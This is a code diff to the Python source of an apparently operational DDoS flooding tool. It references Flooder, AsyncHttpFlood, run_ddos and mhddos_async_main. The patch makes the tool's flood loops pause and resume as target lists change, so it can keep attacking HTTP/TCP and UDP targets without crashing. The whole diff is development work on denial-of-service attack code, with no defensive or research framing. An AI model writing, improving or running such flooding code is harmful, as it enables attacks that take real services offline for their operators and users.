@@ -27,15 +27,22 @@ class Flooder:
         self._switch_after = switch_after
         self._runnables = None
         self._current_task = None
+        self._ready = asyncio.Event()
 
-    def update_targets(self, runnables: Iterator[AsyncHttpFlood]) -> None:
+    def update_targets(self, runnables: Optional[Iterator[AsyncHttpFlood]]) -> None:
         self._runnables = runnables
         if self._current_task is not None:
+            # XXX: do I also need to await on the task to make sure it's
+            #      actually cancelled?
             self._current_task.cancel()
-   
+        if not self._runnables:
+            self._ready.clear()
+        else:
+            self._ready.set()
+
     async def loop(self):
-        assert self._runnables is not None
         while True:
+            await self._ready.wait()
             runnable = next(self._runnables)
             for _ in range(self._switch_after):
                 try:
@@ -141,10 +148,12 @@ async def run_ddos(
             else:
                 raise ValueError(f"Unsupported scheme given: {target.url.scheme}")
         if kwargs_list:
-            # XXX: not gonna work if there are no TCP targets at first
             runnables_iter = cycle(mhddos_async_main(**kwargs) for kwargs in kwargs_list)
-            for flooder in flooders:
-                flooder.update_targets(runnables_iter)
+        else:
+            # This will cancel running tasks and pause loop before getting new runnables
+            runnables_iter = None
+        for flooder in flooders:
+            flooder.update_targets(runnables_iter)
         if udp_kwargs_list:
             if udp_tasks:
                 for task in udp_tasks:
